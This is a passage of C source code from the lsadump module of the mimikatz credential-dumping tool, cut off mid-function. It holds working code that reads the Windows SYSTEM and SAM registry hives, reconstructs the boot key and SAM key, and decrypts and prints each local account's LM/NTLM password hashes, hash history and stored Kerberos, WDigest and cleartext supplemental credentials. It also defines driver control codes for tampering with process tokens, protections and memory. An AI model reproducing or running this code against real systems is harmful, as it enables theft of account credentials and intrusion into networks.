/*	Benjamin DELPY `gentilkiwi`
	https://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "kuhl_m_lsadump.h"
#include "kull_m_ntdll_export.h"

#define RtlEqualGuid(L1, L2) (RtlEqualMemory(L1, L2, sizeof(GUID)))

#define IOCTL_MIMIDRV_RAW					CTL_CODE(FILE_DEVICE_UNKNOWN, 0x000, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_PING					CTL_CODE(FILE_DEVICE_UNKNOWN, 0x001, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_BSOD					CTL_CODE(FILE_DEVICE_UNKNOWN, 0x002, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_DEBUG_BUFFER			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x003, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

#define IOCTL_MIMIDRV_SYSENVSET				CTL_CODE(FILE_DEVICE_UNKNOWN, 0x004, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

#define IOCTL_MIMIDRV_PROCESS_LIST			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x010, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_PROCESS_TOKEN			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x011, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_PROCESS_PROTECT		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x012, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_PROCESS_FULLPRIV		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x013, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

#define IOCTL_MIMIDRV_MODULE_LIST			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x020, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

#define IOCTL_MIMIDRV_SSDT_LIST				CTL_CODE(FILE_DEVICE_UNKNOWN, 0x030, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

#define IOCTL_MIMIDRV_NOTIFY_PROCESS_LIST	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x040, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_NOTIFY_THREAD_LIST	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x041, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_NOTIFY_IMAGE_LIST		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x042, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_NOTIFY_REG_LIST		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x043, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_NOTIFY_OBJECT_LIST	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x044, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

#define IOCTL_MIMIDRV_FILTER_LIST			CTL_CODE(FILE_DEVICE_UNKNOWN, 0x050, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_MINIFILTER_LIST		CTL_CODE(FILE_DEVICE_UNKNOWN, 0x051, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

#define IOCTL_MIMIDRV_VM_READ				CTL_CODE(FILE_DEVICE_UNKNOWN, 0x060, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_VM_WRITE				CTL_CODE(FILE_DEVICE_UNKNOWN, 0x061, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_VM_ALLOC				CTL_CODE(FILE_DEVICE_UNKNOWN, 0x062, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define IOCTL_MIMIDRV_VM_FREE				CTL_CODE(FILE_DEVICE_UNKNOWN, 0x063, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

#define IOCTL_MIMIDRV_CREATEREMOTETHREAD	CTL_CODE(FILE_DEVICE_UNKNOWN, 0x070, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)

BOOL kull_m_kernel_ioctl_handle(HANDLE hDriver, DWORD ioctlCode, PVOID bufferIn, DWORD szBufferIn, PVOID* pBufferOut, PDWORD pSzBufferOut, BOOL autobuffer)
{
	BOOL status = FALSE;
	DWORD lStatus = ERROR_MORE_DATA, returned;

	if (!autobuffer)
	{
		status = DeviceIoControl(hDriver, ioctlCode, bufferIn, szBufferIn, pBufferOut ? *pBufferOut : NULL, pSzBufferOut ? *pSzBufferOut : 0, &returned, NULL);
	}
	else
	{
		for (*pSzBufferOut = 0x10000; (lStatus == ERROR_MORE_DATA) && (*pBufferOut = LocalAlloc(LPTR, *pSzBufferOut)); *pSzBufferOut <<= 1)
		{
			if (status = DeviceIoControl(hDriver, ioctlCode, bufferIn, szBufferIn, *pBufferOut, *pSzBufferOut, &returned, NULL))
			{
				lStatus = ERROR_SUCCESS;
			}
			else
			{
				lStatus = GetLastError();
				if (lStatus == ERROR_MORE_DATA)
					LocalFree(*pBufferOut);
			}
		}
	}
	if (!status)
	{
		// PRINT_ERROR_AUTO(L"DeviceIoControl (0x%08x) : 0x%08x\n", ioctlCode, GetLastError());
		if (autobuffer)
			LocalFree(*pBufferOut);
	}
	else if (pSzBufferOut)
		*pSzBufferOut = returned;
	return status;
}

NTSTATUS kuhl_m_lsadump_sam(int argc, wchar_t * argv[])
{
	kull_m_ntdll_init();

	HANDLE hDataSystem, hDataSam;
	PKULL_M_REGISTRY_HANDLE hRegistry, hRegistry2;
	HKEY hSystem, hSam;
	BYTE sysKey[SYSKEY_LENGTH];
	LPCWSTR szSystem = NULL, szSam = NULL;

	if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL))
	{
		hDataSystem = CreateFile(szSystem, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
		if(hDataSystem != INVALID_HANDLE_VALUE)
		{
			if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSystem, FALSE, &hRegistry))
			{
				if(kuhl_m_lsadump_getComputerAndSyskey(hRegistry, NULL, sysKey))
				{
					if(kull_m_string_args_byName(argc, argv, L"sam", &szSam, NULL))
					{
						hDataSam = CreateFile(szSam, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
						if(hDataSam != INVALID_HANDLE_VALUE)
						{
							if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_HIVE, hDataSam, FALSE, &hRegistry2))
							{
								kuhl_m_lsadump_getUsersAndSamKey(hRegistry2, NULL, sysKey);
								kull_m_registry_close(hRegistry2);
							}
							CloseHandle(hDataSam);
						}
						else PRINT_ERROR_AUTO(L"CreateFile (SAM hive)");
					}
				}
				kull_m_registry_close(hRegistry);
			}
			CloseHandle(hDataSystem);
		}
		else PRINT_ERROR_AUTO(L"CreateFile (SYSTEM hive)");
	}
	else
	{
		if(kull_m_registry_open(KULL_M_REGISTRY_TYPE_OWN, NULL, FALSE, &hRegistry))
		{
			if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SYSTEM", 0, KEY_READ, &hSystem))
			{
				if(kuhl_m_lsadump_getComputerAndSyskey(hRegistry, hSystem, sysKey))
				{
					if(kull_m_registry_RegOpenKeyEx(hRegistry, HKEY_LOCAL_MACHINE, L"SAM", 0, KEY_READ, &hSam))
					{
						kuhl_m_lsadump_getUsersAndSamKey(hRegistry, hSam, sysKey);
						kull_m_registry_RegCloseKey(hRegistry, hSam);
					}
					else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx (SAM)");
				}
				kull_m_registry_RegCloseKey(hRegistry, hSystem);
			}
			kull_m_registry_close(hRegistry);
		}
	}
	return STATUS_SUCCESS;
}

const wchar_t * kuhl_m_lsadump_CONTROLSET_SOURCES[] = {L"Current", L"Default"};
BOOL kuhl_m_lsadump_getCurrentControlSet(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hSystemBase, PHKEY phCurrentControlSet)
{
	BOOL status = FALSE;
	HKEY hSelect;
	DWORD i, szNeeded, controlSet;

	wchar_t currentControlSet[] = L"ControlSet000";

	if(kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, L"Select", 0, KEY_READ, &hSelect))
	{
		for(i = 0; !status && (i < ARRAYSIZE(kuhl_m_lsadump_CONTROLSET_SOURCES)); i++)
		{
			szNeeded = sizeof(DWORD); 
			status = kull_m_registry_RegQueryValueEx(hRegistry, hSelect, kuhl_m_lsadump_CONTROLSET_SOURCES[i], NULL, NULL, (LPBYTE) &controlSet, &szNeeded);
		}

		if(status)
		{
			status = FALSE;
			if(swprintf_s(currentControlSet + 10, 4, L"%03u", controlSet) != -1)
				status = kull_m_registry_RegOpenKeyEx(hRegistry, hSystemBase, currentControlSet, 0, KEY_READ, phCurrentControlSet);
		}
		kull_m_registry_RegCloseKey(hRegistry, hSelect);
	}
	return status;
}

const wchar_t * kuhl_m_lsadump_SYSKEY_NAMES[] = {L"JD", L"Skew1", L"GBG", L"Data"};
const BYTE kuhl_m_lsadump_SYSKEY_PERMUT[] = {11, 6, 7, 1, 8, 10, 14, 0, 3, 5, 2, 15, 13, 9, 12, 4};
BOOL kuhl_m_lsadump_getSyskey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hLSA, LPBYTE sysKey)
{
	BOOL status = TRUE;
	DWORD i;
	HKEY hKey;
	wchar_t buffer[8 + 1];
	DWORD szBuffer;
	BYTE buffKey[SYSKEY_LENGTH];

	for(i = 0 ; (i < ARRAYSIZE(kuhl_m_lsadump_SYSKEY_NAMES)) && status; i++)
	{
		status = FALSE;
		if(kull_m_registry_RegOpenKeyEx(hRegistry, hLSA, kuhl_m_lsadump_SYSKEY_NAMES[i], 0, KEY_READ, &hKey))
		{
			szBuffer = 8 + 1;
			if(kull_m_registry_RegQueryInfoKey(hRegistry, hKey, buffer, &szBuffer, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))
				status = swscanf_s(buffer, L"%x", (DWORD *) &buffKey[i*sizeof(DWORD)]) != -1;
			kull_m_registry_RegCloseKey(hRegistry, hKey);
		}
		else PRINT_ERROR_AUTO(L"LSA Key Class read error\n");
	}
	
	if(status)
		for(i = 0; i < SYSKEY_LENGTH; i++)
			sysKey[i] = buffKey[kuhl_m_lsadump_SYSKEY_PERMUT[i]];	

	return status;
}

BOOL kuhl_m_lsadump_getComputerAndSyskey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSystemBase, OUT LPBYTE sysKey)
{
	BOOL status = FALSE;
	PVOID computerName;
	HKEY hCurrentControlSet, hComputerNameOrLSA;

	if(kuhl_m_lsadump_getCurrentControlSet(hRegistry, hSystemBase, &hCurrentControlSet))
	{
		kprintf(L"Domain : ");
		if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hCurrentControlSet, L"Control\\ComputerName\\ComputerName", L"ComputerName", NULL, &computerName, NULL))
		{
			kprintf(L"%s\n", computerName);
			LocalFree(computerName);
		}

		kprintf(L"SysKey : ");
		if(kull_m_registry_RegOpenKeyEx(hRegistry, hCurrentControlSet, L"Control\\LSA", 0, KEY_READ, &hComputerNameOrLSA))
		{
			if(status = kuhl_m_lsadump_getSyskey(hRegistry, hComputerNameOrLSA, sysKey))
			{
				kull_m_string_wprintf_hex(sysKey, SYSKEY_LENGTH, 0);
				kprintf(L"\n");
			}
			else PRINT_ERROR_AUTO(L"kuhl_m_lsadump_getSyskey KO\n");
			kull_m_registry_RegCloseKey(hRegistry, hComputerNameOrLSA);
		}
		else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx LSA KO\n");

		kull_m_registry_RegCloseKey(hRegistry, hCurrentControlSet);
	}
	return status;
}

BOOL kuhl_m_lsadump_getUsersAndSamKey(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hSAMBase, IN LPCBYTE sysKey)
{
	BOOL status = FALSE;
	BYTE samKey[SAM_KEY_DATA_KEY_LENGTH];
	wchar_t * user;
	HKEY hAccount, hUsers, hUser;
	DWORD i, nbSubKeys, szMaxSubKeyLen, szUser, rid;
	PUSER_ACCOUNT_V pUAv;
	LPVOID data;

	if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hSAMBase, L"SAM\\Domains\\Account", L"V", NULL, &data, &szUser))
	{
		// kprintf(L"Local SID : ");
		// kull_m_string_displaySID((PBYTE) data + szUser - (sizeof(SID) + sizeof(DWORD) * 3));
		// kprintf(L"\n");
		LocalFree(data);
	}

	if(kull_m_registry_RegOpenKeyEx(hRegistry, hSAMBase, L"SAM\\Domains\\Account", 0, KEY_READ, &hAccount))
	{
		if(kuhl_m_lsadump_getSamKey(hRegistry, hAccount, sysKey, samKey))
		{
			if(kull_m_registry_RegOpenKeyEx(hRegistry, hAccount, L"Users", 0, KEY_READ, &hUsers))
			{
				if(status = kull_m_registry_RegQueryInfoKey(hRegistry, hUsers, NULL, NULL, NULL, &nbSubKeys, &szMaxSubKeyLen, NULL, NULL, NULL, NULL, NULL, NULL))
				{
					szMaxSubKeyLen++;
					char userName[256], hash[256];
					if(user = (wchar_t *) LocalAlloc(LPTR, (szMaxSubKeyLen + 1) * sizeof(wchar_t)))
					{
						for(i = 0; i < nbSubKeys; i++)
						{
							szUser = szMaxSubKeyLen;
							if(kull_m_registry_RegEnumKeyEx(hRegistry, hUsers, i, user, &szUser, NULL, NULL, NULL, NULL))
							{
								if(_wcsicmp(user, L"Names"))
								{
									if(swscanf_s(user, L"%x", &rid) != -1)
									{
										kprintf(L"\nRID  : %08x (%u)\n", rid, rid);
										if(status &= kull_m_registry_RegOpenKeyEx(hRegistry, hUsers, user, 0, KEY_READ, &hUser))
										{
											if(status &= kull_m_registry_QueryWithAlloc(hRegistry, hUser, L"V", NULL, (LPVOID *) &pUAv, NULL))
											{
												kprintf(L"User : %.*s\n", pUAv->Username.lenght / sizeof(wchar_t), (wchar_t *) (pUAv->datas + pUAv->Username.offset));
												RtlCopyMemory(userName, (wchar_t*)(pUAv->datas + pUAv->Username.offset), pUAv->Username.lenght);
												kuhl_m_lsadump_getHash(&pUAv->LMHash, pUAv->datas, samKey, rid, FALSE, FALSE, hash);
												kuhl_m_lsadump_getHash(&pUAv->NTLMHash, pUAv->datas, samKey, rid, TRUE, FALSE, hash);
												kuhl_m_lsadump_getHash(&pUAv->LMHistory, pUAv->datas, samKey, rid, FALSE, TRUE, hash);
												kuhl_m_lsadump_getHash(&pUAv->NTLMHistory, pUAv->datas, samKey, rid, TRUE, TRUE, hash);
												LocalFree(pUAv);
											}
											kuhl_m_lsadump_getSupplementalCreds(hRegistry, hUser, samKey);
											kull_m_registry_RegCloseKey(hRegistry, hUser);
										}
										else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx user (%s)\n", user);
									}
								}
							}
						}
						LocalFree(user);
					}
				}
				kull_m_registry_RegCloseKey(hRegistry, hUsers);
			}
		}
		else PRINT_ERROR_AUTO(L"kuhl_m_lsadump_getSamKey KO\n");
		kull_m_registry_RegCloseKey(hRegistry, hAccount);
	}
	else PRINT_ERROR_AUTO(L"kull_m_registry_RegOpenKeyEx SAM Accounts");

	return status;
}

const BYTE	kuhl_m_lsadump_NTPASSWORD[] = "NTPASSWORD",
kuhl_m_lsadump_LMPASSWORD[] = "LMPASSWORD",
kuhl_m_lsadump_NTPASSWORDHISTORY[] = "NTPASSWORDHISTORY",
kuhl_m_lsadump_LMPASSWORDHISTORY[] = "LMPASSWORDHISTORY";
BOOL kuhl_m_lsadump_getHash(PSAM_SENTRY pSamHash, LPCBYTE pStartOfData, LPCBYTE samKey, DWORD rid, BOOL isNtlm, BOOL isHistory,char* hash)
{
	BOOL status = FALSE;
	MD5_CTX md5ctx;
	PSAM_HASH pHash = (PSAM_HASH)(pStartOfData + pSamHash->offset);
	PSAM_HASH_AES pHashAes;
	DATA_KEY keyBuffer = { MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest };
	CRYPT_BUFFER cypheredHashBuffer = { 0, 0, NULL };
	PVOID out;
	DWORD len;

	if (pSamHash->offset && pSamHash->lenght)
	{
		switch (pHash->Revision)
		{
		case 1:
			if (pSamHash->lenght >= sizeof(SAM_HASH))
			{
				Ptr_MD5Init(&md5ctx);
				Ptr_MD5Update(&md5ctx, samKey, SAM_KEY_DATA_KEY_LENGTH);
				Ptr_MD5Update(&md5ctx, &rid, sizeof(DWORD));
				Ptr_MD5Update(&md5ctx, isNtlm ? (isHistory ? kuhl_m_lsadump_NTPASSWORDHISTORY : kuhl_m_lsadump_NTPASSWORD) : (isHistory ? kuhl_m_lsadump_LMPASSWORDHISTORY : kuhl_m_lsadump_LMPASSWORD), isNtlm ? (isHistory ? sizeof(kuhl_m_lsadump_NTPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_NTPASSWORD)) : (isHistory ? sizeof(kuhl_m_lsadump_LMPASSWORDHISTORY) : sizeof(kuhl_m_lsadump_LMPASSWORD)));
				Ptr_MD5Final(&md5ctx);
				cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = pSamHash->lenght - FIELD_OFFSET(SAM_HASH, data);
				if (cypheredHashBuffer.Buffer = (PBYTE)LocalAlloc(LPTR, cypheredHashBuffer.Length))
				{
					RtlCopyMemory(cypheredHashBuffer.Buffer, pHash->data, cypheredHashBuffer.Length);
					if (!(status = NT_SUCCESS(RtlDecryptData2(&cypheredHashBuffer, &keyBuffer))))
						PRINT_ERROR_AUTO(L"RtlDecryptData2\n");
				}
			}
			break;
		case 2:
			pHashAes = (PSAM_HASH_AES)pHash;
			if (pHashAes->dataOffset >= SAM_KEY_DATA_SALT_LENGTH)
			{
				if (kull_m_crypto_genericAES128Decrypt(samKey, pHashAes->Salt, pHashAes->data, pSamHash->lenght - FIELD_OFFSET(SAM_HASH_AES, data), &out, &len))
				{
					cypheredHashBuffer.Length = cypheredHashBuffer.MaximumLength = len;
					if (cypheredHashBuffer.Buffer = (PBYTE)LocalAlloc(LPTR, cypheredHashBuffer.Length))
					{
						RtlCopyMemory(cypheredHashBuffer.Buffer, out, len);
						status = TRUE;
					}
					LocalFree(out);
				}
			}
			break;
		default:
			PRINT_ERROR_AUTO(L"Unknow SAM_HASH revision (%hu)\n", pHash->Revision);
		}
		if (status)
			kuhl_m_lsadump_dcsync_decrypt(cypheredHashBuffer.Buffer, cypheredHashBuffer.Length, rid, isNtlm ? (isHistory ? L"ntlm" : L"NTLM") : (isHistory ? L"lm  " : L"LM  "), isHistory, hash);
		if (cypheredHashBuffer.Buffer)
			LocalFree(cypheredHashBuffer.Buffer);
	}
	return status;
}

BOOL kuhl_m_lsadump_dcsync_decrypt(PBYTE encodedData, DWORD encodedDataSize, DWORD rid, LPCWSTR prefix, BOOL isHistory, char* hash)
{
	DWORD i;
	BOOL status = FALSE;
	BYTE data[LM_NTLM_HASH_LENGTH];

	for (i = 0; i < encodedDataSize; i += LM_NTLM_HASH_LENGTH)
	{
		status = NT_SUCCESS(RtlDecryptNtOwfPwdWithIndex(encodedData + i, &rid, data)); // same as RtlDecryptLmOwfPwdWithIndex for LM hash
		if (status)
		{
			if (isHistory)
				kprintf(L"    %s-%2u: ", prefix, i / LM_NTLM_HASH_LENGTH);
			else
				kprintf(L"  Hash %s: ", prefix);
			kull_m_string_wprintf_hex(data, LM_NTLM_HASH_LENGTH, 0);
			if (hash)
			{
				memcpy_s(hash, LM_NTLM_HASH_LENGTH, data, LM_NTLM_HASH_LENGTH);
			}
			kprintf(L"\n");
		}
		else PRINT_ERROR_AUTO(L"RtlDecryptNtOwfPwdWithIndex/RtlDecryptLmOwfPwdWithIndex");
	}
	return status;
}

BOOL kuhl_m_lsadump_getSupplementalCreds(IN PKULL_M_REGISTRY_HANDLE hRegistry, IN HKEY hUser, IN const BYTE samKey[SAM_KEY_DATA_KEY_LENGTH])
{
	BOOL status = FALSE;
	PKIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS pEncCreds;
	DWORD szNeeded = 0;
	PUSER_PROPERTIES properties;
	LPVOID data;

	if (kull_m_registry_RegQueryValueEx(hRegistry, hUser, L"SupplementalCredentials", NULL, NULL, NULL, &szNeeded))
	{
		if (szNeeded > (FIELD_OFFSET(KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS, encrypted) + AES_BLOCK_SIZE + 96)) //header + block + padding in Reserved4
		{
			if (pEncCreds = (PKIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS)LocalAlloc(LPTR, szNeeded))
			{
				if (kull_m_registry_RegQueryValueEx(hRegistry, hUser, L"SupplementalCredentials", NULL, NULL, (LPBYTE)pEncCreds, &szNeeded))
				{
					kprintf(L"\nSupplemental Credentials:\n");
					if (properties = (PUSER_PROPERTIES)LocalAlloc(LPTR, FIELD_OFFSET(USER_PROPERTIES, Reserved4) + pEncCreds->originalSize))
					{
						if (kull_m_crypto_genericAES128Decrypt(samKey, pEncCreds->iv, pEncCreds->encrypted, szNeeded - FIELD_OFFSET(KIWI_ENCRYPTED_SUPPLEMENTAL_CREDENTIALS, encrypted), &data, &properties->Length))
						{
							if (properties->Length == pEncCreds->originalSize)
							{
								status = TRUE;
								RtlCopyMemory(properties->Reserved4, data, properties->Length);
								kuhl_m_lsadump_dcsync_descrUserProperties(properties);
							}
							LocalFree(data);
						}
						LocalFree(properties);
					}
				}
				else PRINT_ERROR_AUTO(L"kull_m_registry_RegQueryValueEx(data)\n");
				LocalFree(pEncCreds);
			}
		}
	}
	return status;
}


const BYTE kuhl_m_lsadump_qwertyuiopazxc[] = "!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%";
const BYTE kuhl_m_lsadump_01234567890123[] = "0123456789012345678901234567890123456789";
BOOL kuhl_m_lsadump_getSamKey(PKULL_M_REGISTRY_HANDLE hRegistry, HKEY hAccount, LPCBYTE sysKey, LPBYTE samKey)
{
	BOOL status = FALSE;
	PDOMAIN_ACCOUNT_F pDomAccF;
	MD5_CTX md5ctx;
	DATA_KEY key = {MD5_DIGEST_LENGTH, MD5_DIGEST_LENGTH, md5ctx.digest};
	CRYPT_BUFFER data = {SAM_KEY_DATA_KEY_LENGTH, SAM_KEY_DATA_KEY_LENGTH, samKey};
	PSAM_KEY_DATA_AES pAesKey;
	PVOID out;
	DWORD len;

	kprintf(L"\nSAMKey : ");
	if(kull_m_registry_OpenAndQueryWithAlloc(hRegistry, hAccount, NULL, L"F", NULL, (LPVOID *) &pDomAccF, NULL))
	{
		switch(pDomAccF->Revision)
		{
		case 2:
		case 3:
			switch(pDomAccF->keys1.Revision)
			{
			case 1:
				Ptr_MD5Init(&md5ctx);
				Ptr_MD5Update(&md5ctx, pDomAccF->keys1.Salt, SAM_KEY_DATA_SALT_LENGTH);
				Ptr_MD5Update(&md5ctx, kuhl_m_lsadump_qwertyuiopazxc, sizeof(kuhl_m_lsadump_qwertyuiopazxc));
				Ptr_MD5Update(&md5ctx, sysKey, SYSKEY_LENGTH);
				Ptr_MD5Update(&md5ctx, kuhl_m_lsadump_01234567890123, sizeof(kuhl_m_lsadump_01234567890123));
				Ptr_MD5Final(&md5ctx);
				RtlCopyMemory(samKey, pDomAccF->keys1.Key, SAM_KEY_DATA_KEY_LENGTH);
				if(!(status = NT_SUCCESS(RtlDecryptData2(&data, &key))))
					PRINT_ERROR_AUTO(L"RtlDecryptData2 KO");
				break;
			case 2:
				pAesKey = (PSAM_KEY_DATA_AES) &pDomAccF->keys1;
				if(kull_m_crypto_genericAES128Decrypt(sysKey, pAesKey->Salt, pAesKey->data, pAesKey->DataLen, &out, &len))
				{
					if(status = (len == SAM_KEY_DATA_KEY_LENGTH))
						RtlCopyMemory(samKey, out, SAM_KEY_DATA_KEY_LENGTH);
					LocalFree(out);
				}
				break;
			default:
				PRINT_ERROR_AUTO(L"Unknow Struct Key revision (%u)", pDomAccF->keys1.Revision);
			}
			break;
		default:
			PRINT_ERROR_AUTO(L"Unknow F revision (%hu)", pDomAccF->Revision);
		}
		LocalFree(pDomAccF);
	}
	else PRINT_ERROR_AUTO(L"kull_m_registry_OpenAndQueryWithAlloc KO");

	if(status)
		kull_m_string_wprintf_hex(samKey, LM_NTLM_HASH_LENGTH, 0);

	kprintf(L"\n");
	return status;
}

DECLARE_CONST_UNICODE_STRING(PrimaryCleartext, L"Primary:CLEARTEXT");
DECLARE_CONST_UNICODE_STRING(PrimaryWDigest, L"Primary:WDigest");
DECLARE_CONST_UNICODE_STRING(PrimaryKerberos, L"Primary:Kerberos");
DECLARE_CONST_UNICODE_STRING(PrimaryKerberosNew, L"Primary:Kerberos-Newer-Keys");
DECLARE_CONST_UNICODE_STRING(PrimaryNtlmStrongNTOWF, L"Primary:NTLM-Strong-NTOWF");
DECLARE_CONST_UNICODE_STRING(Packages, L"Packages");
void kuhl_m_lsadump_dcsync_descrUserProperties(PUSER_PROPERTIES properties)
{
	DWORD i, j, k, szData;
	PUSER_PROPERTY property;
	PBYTE data;
	UNICODE_STRING Name;
	LPSTR value;

	PWDIGEST_CREDENTIALS pWDigest;
	PKERB_STORED_CREDENTIAL pKerb;
	PKERB_KEY_DATA pKeyData;
	PKERB_STORED_CREDENTIAL_NEW pKerbNew;
	PKERB_KEY_DATA_NEW pKeyDataNew;

	if (properties->Length > (FIELD_OFFSET(USER_PROPERTIES, PropertyCount) - FIELD_OFFSET(USER_PROPERTIES, Reserved4)))
	{
		if ((properties->PropertySignature == L'P') && properties->PropertyCount)
		{
			for (i = 0, property = properties->UserProperties; i < properties->PropertyCount; i++, property = (PUSER_PROPERTY)((PBYTE)property + FIELD_OFFSET(USER_PROPERTY, PropertyName) + property->NameLength + property->ValueLength))
			{
				Name.Length = Name.MaximumLength = property->NameLength;
				Name.Buffer = property->PropertyName;

				value = (LPSTR)((LPCBYTE)property->PropertyName + property->NameLength);
				szData = property->ValueLength / 2;

				kprintf(L"* %wZ *\n", &Name);
				if (data = (PBYTE)LocalAlloc(LPTR, szData))
				{
					for (j = 0; j < szData; j++)
					{
						sscanf_s(&value[j * 2], "%02x", &k);
						data[j] = (BYTE)k;
					}

					if (Ptr_RtlEqualUnicodeString(&PrimaryCleartext, &Name, TRUE) || Ptr_RtlEqualUnicodeString(&Packages, &Name, TRUE))
					{
						kprintf(L"    %.*s\n", szData / sizeof(wchar_t), (PWSTR)data);
					}
					else if (Ptr_RtlEqualUnicodeString(&PrimaryWDigest, &Name, TRUE))
					{
						pWDigest = (PWDIGEST_CREDENTIALS)data;
						for (j = 0; j < pWDigest->NumberOfHashes; j++)
						{
							kprintf(L"    %02u  ", j + 1);
							kull_m_string_wprintf_hex(pWDigest->Hash[j], MD5_DIGEST_LENGTH, 0);
							kprintf(L"\n");
						}
					}
					else if (Ptr_RtlEqualUnicodeString(&PrimaryKerberos, &Name, TRUE))
					{
						pKerb = (PKERB_STORED_CREDENTIAL)data;
						kprintf(L"    Default Salt : %.*s\n", pKerb->DefaultSaltLength / sizeof(wchar_t), (PWSTR)((PBYTE)pKerb + pKerb->DefaultSaltOffset));
						pKeyData = (PKERB_KEY_DATA)((PBYTE)pKerb + sizeof(KERB_STORED_CREDENTIAL));
						pKeyData = kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->CredentialCount, L"Credentials");
						kuhl_m_lsadump_lsa_keyDataInfo(pKerb, pKeyData, pKerb->OldCredentialCount, L"OldCredentials");
					}
					else if (Ptr_RtlEqualUnicodeString(&PrimaryKerberosNew, &Name, TRUE))
					{
						pKerbNew = (PKERB_STORED_CREDENTIAL_NEW)data;
						kprintf(L"    Default Salt : %.*s\n    Default Iterations : %u\n", pKerbNew->DefaultSaltLength / sizeof(wchar_t), (PWSTR)((PBYTE)pKerbNew + pKerbNew->DefaultSaltOffset), pKerbNew->DefaultIterationCount);
						pKeyDataNew = (PKERB_KEY_DATA_NEW)((PBYTE)pKerbNew + sizeof(KERB_STORED_CREDENTIAL_NEW));
						pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->CredentialCount, L"Credentials");
						pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->ServiceCredentialCount, L"ServiceCredentials");
						pKeyDataNew = kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OldCredentialCount, L"OldCredentials");
						kuhl_m_lsadump_lsa_keyDataNewInfo(pKerbNew, pKeyDataNew, pKerbNew->OlderCredentialCount, L"OlderCredentials");
					}
					else if (Ptr_RtlEqualUnicodeString(&PrimaryNtlmStrongNTOWF, &Name, TRUE))
					{
						kprintf(L"    Random Value : ");
						kull_m_string_wprintf_hex(data, szData, 0);
						kprintf(L"\n");
					}
					else
					{
						kprintf(L"    Unknown data : ");
						kull_m_string_wprintf_hex(data, szData, 1);
						kprintf(L"\n");
					}
					kprintf(L"\n");
					LocalFree(data);
				}
			}
		}
	}
}

BOOL kuhl_m_lsadump_getSids(IN PKULL_M_REGISTRY_HANDLE hSecurity, IN HKEY hPolicyBase, IN LPCWSTR littleKey, IN LPCWSTR prefix)
{
	BOOL status = FALSE;
